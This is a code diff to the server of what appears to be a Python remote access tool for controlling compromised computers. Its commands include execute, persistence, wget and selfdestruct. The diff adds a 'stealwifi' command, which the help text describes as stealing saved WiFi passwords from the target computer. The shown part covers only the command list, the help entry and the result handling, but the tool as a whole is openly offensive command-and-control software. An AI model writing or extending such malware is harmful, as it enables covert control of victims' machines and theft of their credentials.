@@ -29,12 +29,13 @@ BANNER = '''
 '''
 COMMANDS = [ 'cat', 'client', 'clients', 'execute', 'goodbye', 'help', 'kill',
              'ls', 'persistence', 'pwd', 'quit', 'rekey', 'scan', 'selfdestruct',
-             'survey', 'unzip', 'wget' ]
+             'survey', 'unzip', 'wget', 'stealwifi' ]
 HELP_TEXT = '''
 cat <file>          - Output a file to the screen.
 client <id>         - Connect to a client.
 clients             - List connected clients.
 execute <command>   - Execute a command on the target.
+stealwifi           - Steal WIFI password saved on target computer.
 goodbye             - Exit the server and keep all client connections alive.
 help                - Show this help menu.
 kill                - Kill the client connection.
@@ -143,9 +144,9 @@ class ClientConnection():
         if cmd == 'rekey':
             self.dhkey = diffiehellman(self.conn)
 
-        # results of execute, persistence, scan, survey, unzip, or wget
+        # results of execute, persistence, scan, survey, unzip, wget, or stealwifi
         if cmd in [ 'cat', 'execute', 'ls', 'persistence', 'pwd', 'rekey',
-                    'scan', 'survey', 'unzip', 'wget' ]:
+                    'scan', 'survey', 'unzip', 'wget', 'stealwifi' ]:
             print 'Running {}...'.format(cmd)
             recv_data = decrypt(self.conn.recv(4096), self.dhkey)
             print recv_data
